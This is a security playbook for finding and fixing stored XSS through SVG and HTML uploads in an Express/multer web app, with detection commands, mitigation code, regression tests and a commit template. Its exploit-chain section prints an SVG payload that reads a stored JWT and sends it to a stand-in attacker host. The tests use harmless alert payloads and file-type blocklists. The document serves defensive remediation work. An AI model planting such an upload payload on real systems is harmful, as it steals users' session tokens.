# Playbook — XSS via SVG/HTML upload

**CVSS reference:** AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:L → **8.0 HIGH** (escalates to 9.0+ if victim is admin).

**OWASP:** A03:2021 Stored XSS + A04:2021 Insecure Design.

**Empirically validated:** mitigated against `aglaya-kanban-desk` (commit `402b0d7`, 27 May 2026).

---

## Detection

Run these in sequence:

```bash
# 1. Multer without fileFilter?
grep -A 10 "multer({" server/ 2>/dev/null | grep -B 1 -A 8 "storage" | grep -c "fileFilter"
# Expected: ≥1 → fileFilter present. 0 → CRITICAL finding.

# 2. Is /uploads served by express.static without auth?
grep -rn "express.static\|app.use.*uploads" server/
# Look for app.use('/uploads', express.static(...)) WITHOUT preceding requireAuth.

# 3. Is the upload path proxied from same-origin (Netlify/Vercel)?
cat netlify.toml _redirects vercel.json 2>/dev/null | grep -A 3 "uploads\|/api/"
# If /uploads/* is proxied to the API origin from kanban.aglaya.biz (or any same-origin),
# then SVG with <script> executes in the kanban origin = XSS.

# 4. Where does the JWT live?
grep -rn "localStorage.setItem\|localStorage.getItem" client/src/ | grep -i "token\|jwt\|session"
# If JWT in localStorage → XSS exfiltrable. The full chain is now exploitable.
```

If checks 1 + 2 (or 3) + 4 are all positive → **CRITICAL IMMEDIATE**.

---

## Exploit chain (conceptual, do NOT execute against production without explicit consent)

```html
<!-- evil.svg, uploaded by any authenticated user -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script><![CDATA[
    fetch('https://attacker.example/exfil?t=' +
      encodeURIComponent(localStorage.getItem('aglaya_token') || ''));
  ]]></script>
</svg>
```

1. Attacker (any registered user) uploads `evil.svg` via legitimate upload endpoint.
2. API responds `{ data: { url: "/uploads/<uuid>.svg" } }`.
3. Attacker pastes URL in card description / comment visible to victim.
4. Victim opens URL in new tab (target=_blank, middle-click, or direct nav).
5. Browser loads SVG at same-origin → script executes.
6. JWT exfiltrated. Attacker reuses for full token TTL (often 7 days).

---

## Mitigation (4-layer defense)

### Layer 1 — Install `file-type` for magic-bytes validation

```bash
npm install file-type@16.5.4
```

**Note:** `file-type` v17+ is ESM-only. If the project is CommonJS (`require()`), use v16. Verify with:

```bash
node -e "const ft = require('file-type'); console.log(typeof ft.fromFile);"
# Should print: function
```

### Layer 2 — Patch multer with allowlist + extension blocklist

In `server/routes/uploads.js` (or equivalent), replace the multer config:

```javascript
const FileType = require('file-type');

const ALLOWED_MIME = new Set([
  'image/png',
  'image/jpeg',
  'image/webp',
  'image/gif',
  'application/pdf',
  'text/csv',
  'text/plain',
]);

const FORBIDDEN_MIME = new Set([
  'image/svg+xml',
  'text/html',
  'application/xhtml+xml',
  'application/javascript',
  'text/javascript',
  'application/x-shockwave-flash',
  'application/x-msdownload',
]);

const FORBIDDEN_EXT = /\.(svg|html?|xhtml|js|mjs|swf|exe|bat|cmd|sh|ps1|vbs)$/i;

const upload = multer({
  storage,
  limits: { fileSize: 50 * 1024 * 1024 }, // 50 MB
  fileFilter: (req, file, cb) => {
    if (FORBIDDEN_EXT.test(file.originalname)) {
      return cb(new Error('FILE_TYPE_FORBIDDEN: extensión no permitida'), false);
    }
    if (FORBIDDEN_MIME.has(file.mimetype)) {
      return cb(new Error('FILE_TYPE_FORBIDDEN: MIME no permitido'), false);
    }
    if (!ALLOWED_MIME.has(file.mimetype)) {
      return cb(new Error('FILE_TYPE_NOT_ALLOWED: tipo no soportado'), false);
    }
    cb(null, true);
  },
});
```

### Layer 3 — Magic-bytes validation post-upload

Modify the upload handler:

```javascript
const fs = require('fs');

router.post('/', requireAuth, upload.single('file'), async (req, res, next) => {
  try {
    const filePath = req.file.path;
    const detected = await FileType.fromFile(filePath);

    if (!detected || !ALLOWED_MIME.has(detected.mime)) {
      fs.unlinkSync(filePath);
      return res.status(400).json({
        error: 'FILE_MAGIC_MISMATCH',
        message: 'El contenido del archivo no coincide con un tipo permitido',
      });
    }

    res.json({ data: { url: `/uploads/${req.file.filename}` } });
  } catch (err) {
    next(err);
  }
});
```

### Layer 4 — Error handler

```javascript
router.use((err, req, res, next) => {
  if (err.message && err.message.startsWith('FILE_TYPE_')) {
    return res.status(400).json({ error: err.message });
  }
  if (err.code === 'LIMIT_FILE_SIZE') {
    return res.status(413).json({ error: 'FILE_TOO_LARGE' });
  }
  next(err);
});
```

---

## Regression tests

Create `server/tests/uploads.test.js`:

```javascript
const request = require('supertest');
const app = require('../app');
const path = require('path');
const fs = require('fs');

describe('POST /api/uploads', () => {
  let token;
  beforeAll(async () => {
    token = await getTestToken(); // implement per project's auth pattern
  });

  it('rejects .svg with 400 FILE_TYPE_FORBIDDEN', async () => {
    const svgPath = path.join(__dirname, 'fixtures', 'evil.svg');
    fs.writeFileSync(svgPath, '<svg><script>alert(1)</script></svg>');
    const res = await request(app)
      .post('/api/uploads')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', svgPath);
    expect(res.status).toBe(400);
    expect(res.body.error).toMatch(/FILE_TYPE_FORBIDDEN/);
    fs.unlinkSync(svgPath);
  });

  it('rejects .html with 400 FILE_TYPE_FORBIDDEN', async () => {
    const htmlPath = path.join(__dirname, 'fixtures', 'evil.html');
    fs.writeFileSync(htmlPath, '<html><script>alert(1)</script></html>');
    const res = await request(app)
      .post('/api/uploads')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', htmlPath);
    expect(res.status).toBe(400);
    fs.unlinkSync(htmlPath);
  });

  it('rejects PNG renamed to evil.png that is actually script content', async () => {
    const fakeImagePath = path.join(__dirname, 'fixtures', 'fake.png');
    fs.writeFileSync(fakeImagePath, '<script>alert(1)</script>');
    const res = await request(app)
      .post('/api/uploads')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', fakeImagePath);
    expect(res.status).toBe(400);
    expect(res.body.error).toMatch(/FILE_MAGIC_MISMATCH/);
    fs.unlinkSync(fakeImagePath);
  });

  it('accepts legitimate PNG with 200 OK', async () => {
    const pngPath = path.join(__dirname, 'fixtures', 'legitimate.png');
    // Pre-existing valid PNG fixture
    const res = await request(app)
      .post('/api/uploads')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', pngPath);
    expect(res.status).toBe(200);
    expect(res.body.data.url).toMatch(/^\/uploads\/.+\.png$/);
  });

  it('rejects unauthenticated POST with 401', async () => {
    const pngPath = path.join(__dirname, 'fixtures', 'legitimate.png');
    const res = await request(app)
      .post('/api/uploads')
      .attach('file', pngPath);
    expect(res.status).toBe(401);
  });
});
```

Run: `npm test`. All 5 must pass before commit.

---

## Smoke test against production

After deploy:

```bash
TOKEN="<production JWT>"
cat > /tmp/evil.svg <<'SVG'
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert('XSS')</script>
</svg>
SVG

curl -X POST https://<your-app>/api/uploads \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/evil.svg" \
  -w "\nHTTP %{http_code}\n"
# Expected: HTTP 400 with FILE_TYPE_FORBIDDEN

rm /tmp/evil.svg
```

---

## Commit message template

```
fix(security): block SVG/HTML/script uploads (XSS via /uploads/* CVSS 8.0)

Multer accepted any file type (no fileFilter). Files in /uploads/* were
served by express.static without auth and proxied from the public origin
via reverse proxy. An SVG with embedded <script> executed in the app's
origin when navigated to directly, exfiltrating the JWT from localStorage
(vigent N days without rotation).

Exploit chain: authenticated user uploads evil.svg → URL /uploads/<uuid>.svg
pasted in card description → victim opens new tab → script executes
same-origin → JWT stolen → attacker reuses session for token TTL.

CVSS 3.1: 8.0 HIGH (AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:L).
OWASP: A03:2021 Stored XSS + A04:2021 Insecure Design.

Mitigation (4 layers):
1. fileFilter with MIME allowlist (png, jpeg, webp, gif, pdf, csv, txt).
2. Extension blocklist (svg, html, js, etc.) against MIME spoofing.
3. Magic-bytes validation post-upload via file-type@16.
4. Error handler returns 400/413 instead of 500.

Tests added: server/tests/uploads.test.js (5 cases).

Identified during Mariana Trench audit, finding ID <ID>.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
```

---

## Follow-up — long term hardening

The 4-layer fix closes the exploitable chain, but the **industry standard** for user-uploaded content is:

- Serve `/uploads/*` from a separate sandboxed origin (e.g. `uploads.app.com` distinct from `app.com`) so even if a malicious file slips through, it cannot read the main origin's localStorage / cookies.
- Examples: GitHub uses `githubusercontent.com`, Discord uses `cdn.discordapp.com`.

Add to roadmap as P2 hardening.
